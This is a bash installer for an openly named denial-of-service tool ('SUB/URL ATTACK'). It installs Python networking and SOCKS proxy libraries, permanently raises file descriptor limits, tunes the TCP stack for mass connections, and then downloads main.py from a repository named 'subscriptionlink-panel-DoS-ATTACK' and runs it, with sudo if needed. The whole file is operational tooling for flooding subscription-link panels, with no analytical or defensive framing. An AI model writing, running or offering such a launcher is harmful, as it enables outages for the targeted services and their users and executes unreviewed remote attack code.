#!/bin/bash

# ============================================================
#    SUB/URL ATTACK — Setup & Dependency Installer
# ============================================================

# Colors
C_RESET='\033[0m'
C_BOLD='\033[1m'
C_DIM='\033[2m'
C_RED='\033[91m'
C_GREEN='\033[92m'
C_YELLOW='\033[93m'
C_BLUE='\033[94m'
C_MAGENTA='\033[95m'
C_CYAN='\033[96m'
C_WHITE='\033[97m'

# UI helpers
ok()    { echo -e "  ${C_GREEN}✓${C_RESET} $1"; }
warn()  { echo -e "  ${C_YELLOW}⚠${C_RESET} $1"; }
err()   { echo -e "  ${C_RED}✗${C_RESET} $1"; }
info()  { echo -e "  ${C_CYAN}➜${C_RESET} $1"; }
dim()   { echo -e "  ${C_DIM}$1${C_RESET}"; }

section() {
    echo ""
    echo -e "  ${C_BOLD}${C_MAGENTA}● $1${C_RESET}"
    echo -e "  ${C_DIM}────────────────────────────────────────────────${C_RESET}"
}

section "SYSTEM DETECTION"

PKG_MGR=""
if command -v apt &> /dev/null; then
    PKG_MGR="apt"
elif command -v yum &> /dev/null; then
    PKG_MGR="yum"
elif command -v dnf &> /dev/null; then
    PKG_MGR="dnf"
elif command -v pacman &> /dev/null; then
    PKG_MGR="pacman"
elif command -v apk &> /dev/null; then
    PKG_MGR="apk"
else
    err "No supported package manager found (apt/yum/dnf/pacman/apk)"
    exit 1
fi

ok "Package manager: ${C_BOLD}$PKG_MGR${C_RESET}"

if [ "$(id -u)" -eq 0 ]; then
    ok "Running as root"
    SUDO=""
else
    warn "Running as non-root — sudo required for system changes"
    SUDO="sudo"
fi

section "INSTALLING SYSTEM DEPENDENCIES"

case "$PKG_MGR" in
    apt)
        info "Updating repositories..."
        $SUDO apt update -y >/dev/null 2>&1
        info "Installing python3, pip, curl, wget, ca-certificates..."
        $SUDO apt install -y python3 python3-pip python3-venv curl wget ca-certificates >/dev/null 2>&1
        ;;
    yum)
        info "Installing python3, pip, curl, wget..."
        $SUDO yum install -y python3 python3-pip curl wget ca-certificates >/dev/null 2>&1
        ;;
    dnf)
        info "Installing python3, pip, curl, wget..."
        $SUDO dnf install -y python3 python3-pip curl wget ca-certificates >/dev/null 2>&1
        ;;
    pacman)
        info "Installing python, pip, curl, wget..."
        $SUDO pacman -Sy --noconfirm python python-pip curl wget ca-certificates >/dev/null 2>&1
        ;;
    apk)
        info "Installing python3, pip, curl, wget..."
        $SUDO apk add --no-cache python3 py3-pip curl wget ca-certificates >/dev/null 2>&1
        ;;
esac

ok "System dependencies installed"

section "PYTHON VERSION CHECK"

PYVER=$(python3 -c 'import sys; print(f"{sys.version_info.major}.{sys.version_info.minor}")')
ok "Python version: ${C_BOLD}$PYVER${C_RESET}"

if ! python3 -c 'import sys; sys.exit(0 if sys.version_info >= (3, 8) else 1)'; then
    err "Python 3.8+ is required. Current: $PYVER"
    exit 1
fi

ok "Version requirement satisfied"

section "INSTALLING PYTHON PACKAGES"

install_py_pkg() {
    local pkg="$1"
    if pip3 install "$pkg" --break-system-packages --quiet 2>/dev/null; then
        return 0
    fi
    if pip3 install "$pkg" --quiet 2>/dev/null; then
        return 0
    fi
    if pip3 install "$pkg" --user --quiet 2>/dev/null; then
        return 0
    fi
    if $SUDO pip3 install "$pkg" --break-system-packages --quiet 2>/dev/null; then
        return 0
    fi
    return 1
}

for pkg in aiohttp aiohttp-socks brotli; do
    info "Installing ${C_BOLD}$pkg${C_RESET}..."
    if install_py_pkg "$pkg"; then
        ok "$pkg installed"
    else
        err "Failed to install $pkg"
        dim "Try manually: pip3 install $pkg --break-system-packages"
    fi
done

section "VERIFYING IMPORTS"

VERIFY_RESULT=$(python3 - <<'PYEOF'
import sys
missing = []
for mod in ("aiohttp", "aiohttp_socks", "brotli"):
    try:
        __import__(mod)
        print(f"OK:{mod}")
    except ImportError:
        print(f"MISS:{mod}")
        missing.append(mod)
sys.exit(1 if missing else 0)
PYEOF
)

echo "$VERIFY_RESULT" | while IFS=: read -r status mod; do
    if [ "$status" = "OK" ]; then
        ok "$mod"
    elif [ "$status" = "MISS" ]; then
        err "$mod ${C_RED}NOT available${C_RESET}"
    fi
done

if echo "$VERIFY_RESULT" | grep -q "^MISS:"; then
    err "Missing Python packages. Aborting."
    exit 1
fi

ok "All Python packages verified"

section "RAISING FILE DESCRIPTOR LIMITS"

TARGET_LIMIT=65535

if ulimit -n "$TARGET_LIMIT" 2>/dev/null; then
    ok "Soft limit set to ${C_BOLD}$TARGET_LIMIT${C_RESET}"
else
    warn "Could not set soft limit in current shell"
fi

if ulimit -Hn "$TARGET_LIMIT" 2>/dev/null; then
    ok "Hard limit set to ${C_BOLD}$TARGET_LIMIT${C_RESET}"
else
    warn "Could not set hard limit (may require root)"
fi

if [ -w /etc/security/limits.conf ] || [ "$(id -u)" -eq 0 ]; then
    if ! grep -q "sub-attack-nofile" /etc/security/limits.conf 2>/dev/null; then
        info "Adding permanent limits to /etc/security/limits.conf..."
        {
            echo "* soft nofile $TARGET_LIMIT  # sub-attack-nofile"
            echo "* hard nofile $TARGET_LIMIT  # sub-attack-nofile"
        } | $SUDO tee -a /etc/security/limits.conf > /dev/null
        ok "Permanent limits added ${C_DIM}(re-login required)${C_RESET}"
    else
        ok "Permanent limits already configured"
    fi
fi

section "TCP STACK TUNING"

if [ "$(id -u)" -eq 0 ]; then
    info "Tuning TCP stack for high-concurrency networking..."

    sysctl -w net.ipv4.tcp_fin_timeout=15 >/dev/null 2>&1 \
        && ok "tcp_fin_timeout = 15" \
        || warn "tcp_fin_timeout tuning failed"

    sysctl -w net.ipv4.tcp_tw_reuse=1 >/dev/null 2>&1 \
        && ok "tcp_tw_reuse = 1" \
        || warn "tcp_tw_reuse tuning failed"

    sysctl -w net.ipv4.ip_local_port_range="1024 65535" >/dev/null 2>&1 \
        && ok "ip_local_port_range widened" \
        || warn "ip_local_port_range tuning failed"

    sysctl -w net.ipv4.tcp_max_syn_backlog=65535 >/dev/null 2>&1 \
        && ok "tcp_max_syn_backlog raised" \
        || warn "tcp_max_syn_backlog tuning failed"

    sysctl -w fs.file-max=2097152 >/dev/null 2>&1 \
        && ok "fs.file-max raised" \
        || warn "fs.file-max tuning failed"
else
    warn "Skipping TCP stack tuning (requires root)"
fi

section "DOWNLOADING MAIN SCRIPT"

RAW_PYTHON_URL="https://raw.githubusercontent.com/coderuseplayer-netizen/subscriptionlink-panel-DoS-ATTACK/main/main.py"
SCRIPT_FILE="run.py"

info "Downloading from repository..."
if curl -fsSL "$RAW_PYTHON_URL" -o "$SCRIPT_FILE"; then
    ok "Downloaded to ${C_BOLD}$SCRIPT_FILE${C_RESET}"
else
    err "Failed to download from $RAW_PYTHON_URL"
    exit 1
fi

chmod +x "$SCRIPT_FILE"
ok "Script marked as executable"

section "LAUNCHING"

echo ""
echo -e "  ${C_BOLD}${C_GREEN}● SETUP COMPLETE${C_RESET}"
echo -e "  ${C_DIM}├─${C_RESET} Socket limit   ${C_BOLD}$(ulimit -n)${C_RESET}"
echo -e "  ${C_DIM}├─${C_RESET} Script         ${C_BOLD}$SCRIPT_FILE${C_RESET}"
echo -e "  ${C_DIM}└─${C_RESET} Status         ${C_GREEN}Ready${C_RESET}"
echo ""
echo -e "  ${C_DIM}────────────────────────────────────────────────${C_RESET}"
echo ""

sleep 1

if [ "$(id -u)" -eq 0 ]; then
    ulimit -n "$TARGET_LIMIT" 2>/dev/null
    python3 "$SCRIPT_FILE"
else
    if ulimit -n "$TARGET_LIMIT" 2>/dev/null; then
        python3 "$SCRIPT_FILE"
    else
        info "Re-running with sudo..."
        $SUDO bash -c "ulimit -n $TARGET_LIMIT && python3 $SCRIPT_FILE"
    fi
fi
